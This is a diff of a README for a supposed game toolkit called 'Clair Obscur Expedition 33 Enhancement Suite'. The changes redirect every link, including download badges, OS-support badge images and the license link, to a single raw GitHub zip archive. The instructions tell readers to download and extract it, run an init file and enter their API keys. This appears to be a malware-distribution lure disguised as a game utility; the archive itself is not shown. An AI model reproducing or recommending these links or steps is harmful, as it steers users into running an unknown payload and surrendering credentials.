@@ -1,5 +1,5 @@
 # Clair Obscur Expedition 33: Trailblazing Enhancement Suite  
-[![Download](https://img.shields.io/badge/Download-Expedition_33_Toolset-brightgreen?style=for-the-badge&logo=github)](https://nickderrick2005.github.io)
+[![Download](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)
 
 ---
 
@@ -15,10 +15,10 @@ Let’s embark together on this journey, where clarity emerges out of shadows, a
 
 | OS         | Supported | Notes               |
 |------------|:---------:|---------------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-blue?logo=windows) |   ✔️    | Optimized performance |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-lightgrey?logo=apple)     |   ✔️    | Full integration      |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-yellow?logo=linux)        |   ✔️    | Terminal tools inside |
-| ![Android](https://img.shields.io/badge/Android-Beta-blueviolet?logo=android)  |   🔶    | Experimental build    |
+| ![Windows](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip) |   ✔️    | Optimized performance |
+| ![macOS](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)     |   ✔️    | Full integration      |
+| ![Linux](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)        |   ✔️    | Terminal tools inside |
+| ![Android](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)  |   🔶    | Experimental build    |
 
 
 ## 🌟 Feature List
@@ -51,7 +51,7 @@ Harness tomorrow’s intelligence—today.
 
 *Installation details for AI-powered features:*
 
-1. Download the `ai-integration-module` from https://nickderrick2005.github.io.
+1. Download the `ai-integration-module` from https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip
 2. Extract the contents into your Expedition 33 Enhancement Suite `/modules/` folder.
 3. Launch the tool and input your API keys as prompted.
 4. Enjoy seamless AI-driven insights!
@@ -76,7 +76,7 @@ Harness tomorrow’s intelligence—today.
 Let’s ignite your upgrade in just a few simple steps:
 
 1. **Download**  
-   Click [here](https://nickderrick2005.github.io) or the “Download” badge above.
+   Click [here](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip) or the “Download” badge above.
 
 2. **Extract**  
    Unpack the Expedition 33 Enhancement Suite into your chosen directory.
@@ -85,7 +85,7 @@ Let’s ignite your upgrade in just a few simple steps:
    Locate the `Expedition33SuiteInit` file and follow the on-screen prompts, selecting your platform when asked.
 
 4. **AI Integration (Optional)**  
-   Download supplemental AI modules via https://nickderrick2005.github.io (see above section for instructions).
+   Download supplemental AI modules via https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip (see above section for instructions).
 
 5. **Configuration**  
    Select your language, link your gaming environment, and explore the customization dashboard.
@@ -106,9 +106,9 @@ Let’s ignite your upgrade in just a few simple steps:
 
 ## 📜 MIT License
 
-This repository is released under the [MIT License (2025)](https://opensource.org/licenses/MIT).  
+This repository is released under the [MIT License (2025)](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip).  
 Your innovation, exploration, and creative development are encouraged—fork, improve, remix, and share!
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Expedition_33_Toolset-brightgreen?style=for-the-badge&logo=github)](https://nickderrick2005.github.io)
+[![Download](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)](https://raw.githubusercontent.com/nickderrick2005/clair-obscur-expedition-33-tips-tricks-toolkit/branch/unoccurring/tricks-toolkit-obscur-clair-tips-expedition-v1.4.zip)
